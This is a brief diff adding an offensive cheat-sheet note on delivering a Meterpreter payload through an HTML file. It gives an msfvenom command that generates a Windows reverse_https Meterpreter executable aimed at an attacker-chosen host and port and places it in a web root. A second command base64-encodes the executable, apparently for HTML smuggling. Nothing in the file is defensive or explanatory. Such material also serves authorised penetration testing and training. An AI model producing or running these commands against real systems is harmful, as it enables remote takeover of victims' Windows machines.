@@ -1,0 +1,5 @@
+Meterpreter payload through HTML file:
+
+# sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<lhost> LPORT=<lport> -f exe -o /var/www/html/webstaged.exe
+# base64 /var/www/html/webstaged.exe
+
